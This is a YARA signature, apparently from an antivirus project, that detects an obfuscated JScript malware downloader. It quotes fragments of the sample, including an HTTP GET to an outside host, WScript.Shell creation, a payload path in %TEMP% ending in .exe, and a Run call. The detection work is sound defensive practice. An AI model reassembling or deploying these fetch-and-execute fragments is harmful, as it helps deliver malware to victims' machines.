rule sig_20160401_b31938c5fbcd12569cb61a8bf6944c59 {
  meta:
    description = "datamaliciousorder - file 20160401_b31938c5fbcd12569cb61a8bf6944c59.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f1c019c04738101868f85e49e0a3ad9401617fecf986cfcf502d5317eb24508d"

  strings:
    $s1  = "EqyRp[FoyGqp](\"G\" + \"ET\", \"http://echo-gs.com/i2osa\", false);" fullword ascii
    $s2  = "function YvLuf(XluLap, YuhPge){GltPf = GltPf * 1; return XluLap - YuhPge;};" fullword ascii
    $s3  = "var OydUdr = function KdsAf() {return WScript[BocPa](\"WScript\"+\".Shell\");}(), SadWg = 11;" fullword ascii
    $s4  = "if (EqyRp[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function EjdKts() {return OydUdr[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"SmMFpyUM1.ex\" + \"e\";};" fullword ascii
    $s6  = "function NaMg(){return FisRbr + \"\";};" fullword ascii
    $s7  = "function QiOpr() {return ((RhqPo == true) && (RhqPo == PoFnr)) ? 1 : GltPf;};" fullword ascii
    $s8  = "var NxjPp = false;" fullword ascii
    $s9  = "function ZfyAk()" fullword ascii
    $s10 = "function CrdHj(IkbMvc){OydUdr[\"R\"+\"un\"](IkbMvc, GltPf, GltPf);};" fullword ascii
    $s11 = "var RhqPo = false;" fullword ascii
    $s12 = "function ZllYpn(){return 23;};" fullword ascii
    $s13 = "PoFnr = true; " fullword ascii
    $s14 = "function KfuIa(){return BocPa;};" fullword ascii
    $s15 = "var PoFnr = false;" fullword ascii
    $s16 = "}while (OuqTdr);" fullword ascii
    $s17 = "return YvLuf(CrSkr, GxEd);" fullword ascii
    $s18 = "function AnAes(GpwFp) {var YlyQb = (1, 2, 3, 4, 5, GpwFp); return YlyQb;};" fullword ascii
    $s19 = "RhqPo = true; " fullword ascii
    $s20 = "var IwqRgc = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}